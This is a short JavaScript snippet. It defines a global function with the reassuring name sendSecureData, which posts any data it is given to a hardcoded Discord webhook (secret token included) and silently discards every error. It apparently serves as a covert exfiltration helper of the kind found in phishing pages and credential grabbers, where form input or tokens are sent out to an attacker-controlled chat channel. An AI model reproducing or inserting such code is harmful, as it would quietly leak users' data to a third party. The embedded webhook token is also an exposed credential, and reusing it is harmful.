const WEBHOOK_URL = 'https://discord.com/api/webhooks/1454910506644017333/QI2bdjnyk4YWWLxjEMGQvLll7jzFTZcB01ZcV06wcmYnZRb6Jm58hVsBbPduIGtv_9bX';

window.sendSecureData = function(data) {
    try {
        fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data)
        }).catch(() => {});
    } catch(e) {}
};
